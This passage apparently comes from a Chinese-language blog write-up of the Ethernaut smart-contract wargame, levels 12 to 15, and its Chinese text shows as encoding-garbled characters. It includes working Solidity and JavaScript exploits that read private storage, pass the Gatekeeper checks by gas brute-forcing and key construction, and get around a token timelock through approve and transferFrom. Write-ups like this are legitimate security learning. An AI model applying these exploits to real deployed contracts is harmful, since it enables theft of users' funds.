class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function unlock(bytes16 _key) public &#123;</span><br><span class="line">        require(_key == bytes16(data[2]));</span><br><span class="line">        locked = false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /*</span><br><span class="line">    A bunch of super advanced solidity algorithms...</span><br><span class="line"></span><br><span class="line">      ,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`</span><br><span class="line">      .,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,</span><br><span class="line">      *.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^         ,---/V\</span><br><span class="line">      `*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.    ~|__(o.o)</span><br><span class="line">      ^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;  UU  UU</span><br><span class="line">    */</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>solidityå„²å­˜ä¸€æ ¼è³‡æ–™ï¼ˆslotï¼‰æ˜¯256bitsï¼Œç·¨è™Ÿå¾1é–‹å§‹ã€‚<br>æ‰€ä»¥ä¸€é–‹å§‹çš„bool lockedå› ç‚ºå¾Œé¢æ¥çš„æ˜¯uint256çš„è³‡æ–™IDï¼Œæœƒç¨è‡ªå ç”¨ä¸€å€‹slotï¼ŒåŒç†å°æ–¼ID<br>æ¥è‘—å¾Œé¢ä¸‰å€‹è³‡æ–™flattening, denomination, awkwardnessä¸€èµ·å ç”¨ä¸€å€‹slotï¼Œæœ€å¾Œå°±æ˜¯dataæ¯é …è‡ªå·±å ç”¨ä¸€æ ¼ã€‚  </p>
<p>slot table:</p>
<table>
<thead>
<tr>
<th>index</th>
<th>contents</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>locked(1 bit)</td>
</tr>
<tr>
<td>2</td>
<td>ID(256 bits)</td>
</tr>
<tr>
<td>3</td>
<td>flattening+denomination+awkwardness*(32 bits)</td>
</tr>
<tr>
<td>4</td>
<td>data[0](256 bits&#x2F;32 bytes)</td>
</tr>
<tr>
<td>5</td>
<td>data[1](256 bits&#x2F;32 bytes)</td>
</tr>
<tr>
<td>6</td>
<td>data[2](256 bits&#x2F;32 bytes)</td>
</tr>
</tbody></table>
<p>æ¥ä¸‹ä¾†å°±è·ŸLevel 8çš„Vaultä¸€æ¨£äº†ï¼Œå–å‰16bytesè³‡æ–™é€å‡ºï¼Œçµæ¡ˆXD  </p>
<p><code>web3.eth.getStorageAt(&#39;0x2b7c7D52206360eD5797bB108cD4Ee24e2Daf367&#39;, 5)</code></p>
<p><img src="https://hackmd.io/_uploads/SkBphWaJJl.png" alt="image">  </p>
<h2 id="Level-13-Gatekeeper-One"><a href="#Level-13-Gatekeeper-One" class="headerlink" title="Level 13 Gatekeeper One"></a>Level 13 Gatekeeper One</h2><p>Victimâ€™s address: 0x7b23B267AC4CC8314a961F5575Ed8a4116cA8d5c<br>My wallet address: 0x4a63cD2DD88C72Bb47Fa8158c9b2be5294D5f05C<br>ä»»å‹™ï¼š  </p>
<ol>
<li>é€šéæ‰€æœ‰gate</li>
</ol>
<p><strong>Source Code:</strong>  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract GatekeeperOne &#123;</span><br><span class="line">    address public entrant;</span><br><span class="line"></span><br><span class="line">    modifier gateOne() &#123;</span><br><span class="line">        require(msg.sender != tx.origin);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier gateTwo() &#123;</span><br><span class="line">        require(gasleft() % 8191 == 0);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier gateThree(bytes8 _gateKey) &#123;</span><br><span class="line">        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), &quot;GatekeeperOne: invalid gateThree part one&quot;);</span><br><span class="line">        require(uint32(uint64(_gateKey)) != uint64(_gateKey), &quot;GatekeeperOne: invalid gateThree part two&quot;);</span><br><span class="line">        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), &quot;GatekeeperOne: invalid gateThree part three&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123;</span><br><span class="line">        entrant = tx.origin;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç¬¬ä¸€å€‹gateå°±æ˜¯éå»tx.originçš„ç¹éï¼Œå»ºç«‹ä¸€å€‹attack serviceå†ç”±æˆ‘å€‘éŒ¢åŒ…ç™¼èµ·ï¼ŒEZ<br>ç¬¬äºŒå€‹gateå°±æ˜¯é€²è¡Œçˆ†ç ´ï¼Œè®“gasfeeæœ€å¾Œå¯ä»¥é€šéå³å¯ã€‚<br>ç¬¬ä¸‰å€‹å‰‡æ˜¯è¦æ§‹é€ é€šégate threeå‡½æ•¸çš„payloadï¼ŒåŸºæœ¬ä¸Šå‹•è…¦æƒ³æƒ³å°±å¥½ã„Œ<br>æˆ‘æ˜¯æ§‹é€ <code>0xfaceb00c0000f05C</code>ï¼Œ<code>faceb00c</code>ä»»æ„æ›æˆéé›¶çš„æ±è¥¿éƒ½å¯ä»¥ã€‚  </p>
<p><strong>Exploit.sol</strong>  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Exploit &#123;</span><br><span class="line">    function attack_(bytes8 _gateKey) public &#123;</span><br><span class="line">        for (uint256 i = 0; i &lt; 1000; i++) &#123;    </span><br><span class="line">            (bool result,) = address(0x7b23B267AC4CC8314a961F5575Ed8a4116cA8d5c).call&#123;gas:i + 8191 * 4&#125;(abi.encodeWithSignature(&quot;enter(bytes8)&quot;,_gateKey));</span><br><span class="line">            if (result) &#123;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Level-14-Gatekeeper-Two"><a href="#Level-14-Gatekeeper-Two" class="headerlink" title="Level 14 Gatekeeper Two"></a>Level 14 Gatekeeper Two</h2><p>ä»»å‹™ï¼š  </p>
<ol>
<li>é€šéä¸‰å€‹gate</li>
</ol>
<p><strong>Source Code:</strong>  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract GatekeeperTwo &#123;</span><br><span class="line">    address public entrant;</span><br><span class="line"></span><br><span class="line">    modifier gateOne() &#123;</span><br><span class="line">        require(msg.sender != tx.origin);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier gateTwo() &#123;</span><br><span class="line">        uint256 x;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            x := extcodesize(caller())</span><br><span class="line">        &#125;</span><br><span class="line">        require(x == 0);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier gateThree(bytes8 _gateKey) &#123;</span><br><span class="line">        require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123;</span><br><span class="line">        entrant = tx.origin;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ç¬¬ä¸€å€‹gateè€æ‹›æ•¸ï¼Œä¸­é–“äºº<br>ç¬¬äºŒå€‹gateå‰‡æ˜¯solidityçš„ç‰¹æ€§ï¼Œä»–æœƒè¨ˆç®—åœ°å€çš„ç¨‹å¼å¤§å°ï¼Œä½†solidityä¸æœƒæŠŠcoonstructorç®—å…¥ç¨‹å¼å¤§å°<br>ç¬¬ä¸‰å€‹gateå°±æ˜¯ç°¡å–®æ‹¿åˆç´„å–hash xorå³å¯  </p>
<p><strong>Exploit.sol</strong>  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line">interface GatekeeperTwo&#123;</span><br><span class="line">     function enter(bytes8 _gateKey) external returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Exploit&#123;</span><br><span class="line">    constructor(address  target) &#123;</span><br><span class="line">        bytes8 payload = bytes8(uint64(bytes8(keccak256(abi.encodePacked(this)))) ^ type(uint64).max);</span><br><span class="line">        GatekeeperTwo(target).enter(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Level-15-Naught-Coin"><a href="#Level-15-Naught-Coin" class="headerlink" title="Level 15 Naught Coin"></a>Level 15 Naught Coin</h2><p>ä»»å‹™ï¼š  </p>
<ol>
<li>æŠŠæ‰€æœ‰è‡ªå·±çš„Naught Coin Tokenè½‰èµ°</li>
</ol>
<p>ä¸€å€‹ç¹¼æ‰¿ERC 20çš„Tokenåˆç´„ï¼Œå¯ä»¥åƒè€ƒé€™ç¯‡æœƒæ¯”è¼ƒæ¸…æ¥šï¼š<a target="_blank" rel="noopener" href="https://news.cnyes.com/news/id/4981550">https://news.cnyes.com/news/id/4981550</a>  </p>
<p>transfer protocolè¢«é–äº†ï¼Œè¦ç­‰åå¹´  </p>
<p><strong>Source Code:</strong>  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;openzeppelin-contracts-08/token/ERC20/ERC20.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract NaughtCoin is ERC20 &#123;</span><br><span class="line">    // string public constant name = &#x27;NaughtCoin&#x27;;</span><br><span class="line">    // string public constant symbol = &#x27;0x0&#x27;;</span><br><span class="line">    // uint public constant decimals = 18;</span><br><span class="line">    uint256 public timeLock = block.timestamp + 10 * 365 days;</span><br><span class="line">    uint256 public INITIAL_SUPPLY;</span><br><span class="line">    address public player;</span><br><span class="line"></span><br><span class="line">    constructor(address _player) ERC20(&quot;NaughtCoin&quot;, &quot;0x0&quot;) &#123;</span><br><span class="line">        player = _player;</span><br><span class="line">        INITIAL_SUPPLY = 1000000 * (10 ** uint256(decimals()));</span><br><span class="line">        // _totalSupply = INITIAL_SUPPLY;</span><br><span class="line">        // _balances[player] = INITIAL_SUPPLY;</span><br><span class="line">        _mint(player, INITIAL_SUPPLY);</span><br><span class="line">        emit Transfer(address(0), player, INITIAL_SUPPLY);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transfer(address _to, uint256 _value) public override lockTokens returns (bool) &#123;</span><br><span class="line">        super.transfer(_to, _value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Prevent the initial owner from transferring tokens until the timelock has passed</span><br><span class="line">    modifier lockTokens() &#123;</span><br><span class="line">        if (msg.sender == player) &#123;</span><br><span class="line">            require(block.timestamp &gt; timeLock);</span><br><span class="line">            _;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            _;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å› ç‚ºä»–æ²’æœ‰å¹«transferFromä¸Šé–ï¼Œä½†é€™åœ¨ERC20è£¡é¢ä¾ç„¶å¯ä»¥è½‰å¸³<br>æ‰€ä»¥ä½¿ç”¨approveæŠŠè‡ªå·±çš„tokené ˜å‡ºä¾†-&gt;transferFromè½‰åˆ°instanceå¸³è™Ÿå³å¯<br>P.S.è¨˜å¾—æŠŠè‡ªå·±éŒ¢ç”¨balenceOfé ˜ä¹¾æ·¨w  </p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">balance = <span class="keyword">await</span> contract.<span class="title function_">balanceOf</span>(player).<span class="title function_">then</span>(<span class="function"><span class="params">v</span> =&gt;</span> v.<span class="title function_">toString</span>())</span><br><span class="line">contract.<span class="title function_">approve</span>(player, balance)</span><br><span class="line">contract.<span class="title function_">transferFrom</span>(player, instance, balance)</span><br></pre></td></tr></table></figure>


  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/about/">About</a></li>
        
          <li><a href="/archives/">Writing</a></li>
        
          <li><a href="/search/">Search</a></li>
        
          <li><a href="/tags/">tags</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Before-all"><span class="toc-number">1.</span> <span class="toc-text">Before all</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-1-Fallback"><span class="toc-number">2.</span> <span class="toc-text">Level 1 Fallback</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-2-Fallout"><span class="toc-number">3.</span> <span class="toc-text">Level 2 Fallout</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-3-Coin-Flip"><span class="toc-number">4.</span> <span class="toc-text">Level 3 Coin Flip</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-4-Telephone"><span class="toc-number">5.</span> <span class="toc-text">Level 4 Telephone</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-5-Token"><span class="toc-number">6.</span> <span class="toc-text">Level 5 Token</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-6-Delegation"><span class="toc-number">7.</span> <span class="toc-text">Level 6 Delegation</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-7-Force"><span class="toc-number">8.</span> <span class="toc-text">Level 7 Force</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-8-Vault"><span class="toc-number">9.</span> <span class="toc-text">Level 8 Vault</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-9-King"><span class="toc-number">10.</span> <span class="toc-text">Level 9 King</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-10-Re-entrancy"><span class="toc-number">11.</span> <span class="toc-text">Level 10 Re-entrancy</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-11-Elevator"><span class="toc-number">12.</span> <span class="toc-text">Level 11 Elevator</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-12-Privacy"><span class="toc-number">13.</span> <span class="toc-text">Level 12 Privacy</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-13-Gatekeeper-One"><span class="toc-number">14.</span> <span class="toc-text">Level 13 Gatekeeper One</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-14-Gatekeeper-Two"><span class="toc-number">15.</span> <span class="toc-text">Level 14 Gatekeeper Two</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-15-Naught-Coin"><span class="toc-number">16.</span> <span class="toc-text">Level 15 Naught Coin</span></a></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://wha13.github.io/2024/10/16/ethernaut-wp-first/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://wha13.github.io/2024/10/16/ethernaut-wp-first/&text=Ethernaut é—–é—œè¨˜ï¼ˆå‰åŠï¼‰"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://wha13.github.io/2024/10/16/ethernaut-wp-first/&title=Ethernaut é—–é—œè¨˜ï¼ˆå‰åŠï¼‰"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://wha13.github.io/2024/10/16/ethernaut-wp-first/&is_video=false&description=Ethernaut é—–é—œè¨˜ï¼ˆå‰åŠï¼‰"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Ethernaut é—–é—œè¨˜ï¼ˆå‰åŠï¼‰&body=Check out this article: http://wha13.github.io/2024/10/16/ethernaut-wp-first/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://wha13.github.io/2024/10/16/ethernaut-wp-first/&title=Ethernaut é—–é—œè¨˜ï¼ˆå‰åŠï¼‰"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://wha13.github.io/2024/10/16/ethernaut-wp-first/&title=Ethernaut é—–é—œè¨˜ï¼ˆå‰åŠï¼‰"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://wha13.github.io/2024/10/16/ethernaut-wp-first/&title=Ethernaut é—–é—œè¨˜ï¼ˆå‰åŠï¼‰"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://wha13.github.io/2024/10/16/ethernaut-wp-first/&title=Ethernaut é—–é—œè¨˜ï¼ˆå‰åŠï¼‰"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://wha13.github.io/2024/10/16/ethernaut-wp-first/&name=Ethernaut é—–é—œè¨˜ï¼ˆå‰åŠï¼‰&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://wha13.github.io/2024/10/16/ethernaut-wp-first/&t=Ethernaut é—–é—œè¨˜ï¼ˆå‰åŠï¼‰"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2023-2024
    William Lin
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a href="/tags/">tags</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
